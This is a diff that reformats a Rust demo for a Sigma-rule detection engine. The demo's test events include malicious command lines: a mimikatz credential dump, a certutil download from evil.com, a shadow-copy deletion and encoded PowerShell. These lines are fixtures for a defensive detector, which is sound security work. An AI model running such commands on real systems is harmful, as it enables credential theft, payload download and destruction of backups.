@@ -75,39 +75,71 @@ level: low
 "#;
 
 fn event(pairs: &[(&str, &str)]) -> HashMap<String, String> {
-    pairs.iter().map(|(k,v)| (k.to_string(), v.to_string())).collect()
+    pairs
+        .iter()
+        .map(|(k, v)| (k.to_string(), v.to_string()))
+        .collect()
 }
 
 fn main() {
     let mut engine = SigmaEngine::new();
     let (loaded, errors) = engine.load_rules(RULES);
-    println!("=== Engine loaded: {} rules, {} errors ===\n", loaded.len(), errors.len());
+    println!(
+        "=== Engine loaded: {} rules, {} errors ===\n",
+        loaded.len(),
+        errors.len()
+    );
 
     let test_events = vec![
-        ("notepad.exe", event(&[
-            ("Image", "C:\\Windows\\System32\\notepad.exe"),
-            ("CommandLine", "notepad.exe report.txt"),
-            ("category", "process_creation"), ("product", "windows"),
-        ])),
-        ("mimikatz", event(&[
-            ("Image", "C:\\temp\\m64.exe"),
-            ("CommandLine", "m64.exe sekurlsa::logonpasswords"),
-            ("category", "process_creation"), ("product", "windows"),
-        ])),
-        ("certutil LOLBin", event(&[
-            ("Image", "C:\\Windows\\System32\\certutil.exe"),
-            ("CommandLine", "certutil.exe -urlcache -split -f http://evil.com/payload.exe"),
-            ("category", "process_creation"), ("product", "windows"),
-        ])),
-        ("shadow delete", event(&[
-            ("CommandLine", "cmd /c vssadmin delete shadows /all /quiet"),
-            ("category", "process_creation"),
-        ])),
-        ("encoded ps", event(&[
-            ("CommandLine", "powershell.exe -EncodedCommand SQBFAFgA"),
-            ("Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
-            ("category", "process_creation"), ("product", "windows"),
-        ])),
+        (
+            "notepad.exe",
+            event(&[
+                ("Image", "C:\\Windows\\System32\\notepad.exe"),
+                ("CommandLine", "notepad.exe report.txt"),
+                ("category", "process_creation"),
+                ("product", "windows"),
+            ]),
+        ),
+        (
+            "mimikatz",
+            event(&[
+                ("Image", "C:\\temp\\m64.exe"),
+                ("CommandLine", "m64.exe sekurlsa::logonpasswords"),
+                ("category", "process_creation"),
+                ("product", "windows"),
+            ]),
+        ),
+        (
+            "certutil LOLBin",
+            event(&[
+                ("Image", "C:\\Windows\\System32\\certutil.exe"),
+                (
+                    "CommandLine",
+                    "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
+                ),
+                ("category", "process_creation"),
+                ("product", "windows"),
+            ]),
+        ),
+        (
+            "shadow delete",
+            event(&[
+                ("CommandLine", "cmd /c vssadmin delete shadows /all /quiet"),
+                ("category", "process_creation"),
+            ]),
+        ),
+        (
+            "encoded ps",
+            event(&[
+                ("CommandLine", "powershell.exe -EncodedCommand SQBFAFgA"),
+                (
+                    "Image",
+                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                ),
+                ("category", "process_creation"),
+                ("product", "windows"),
+            ]),
+        ),
     ];
 
     for (label, ev) in &test_events {
@@ -118,7 +150,10 @@ fn main() {
             for m in &matches {
                 let score = m.rule_level.to_score();
                 let bar = "#".repeat((score * 20.0) as usize);
-                println!("[ALERT]  {label:<22} │ {:8} │ score {score:.2} {bar}", m.rule_level.as_str().to_uppercase());
+                println!(
+                    "[ALERT]  {label:<22} │ {:8} │ score {score:.2} {bar}",
+                    m.rule_level.as_str().to_uppercase()
+                );
                 println!("         rule: {}", m.rule_title);
                 println!("         tags: {}\n", m.tags.join(", "));
             }
@@ -127,12 +162,18 @@ fn main() {
 
     // Batch throughput estimate
     let batch: Vec<_> = std::iter::repeat_with(|| test_events[4].1.clone())
-        .take(10_000).collect();
+        .take(10_000)
+        .collect();
     let t0 = std::time::Instant::now();
     let results = engine.evaluate_batch(&batch);
     let elapsed = t0.elapsed();
     let hits: usize = results.iter().map(|r| r.matches.len()).sum();
-    println!("=== Batch: 10,000 events in {elapsed:?} → {} total rule hits ===", hits);
-    println!("    throughput: {:.0}k events/sec",
-             10_000.0 / elapsed.as_secs_f64() / 1000.0);
+    println!(
+        "=== Batch: 10,000 events in {elapsed:?} → {} total rule hits ===",
+        hits
+    );
+    println!(
+        "    throughput: {:.0}k events/sec",
+        10_000.0 / elapsed.as_secs_f64() / 1000.0
+    );
 }
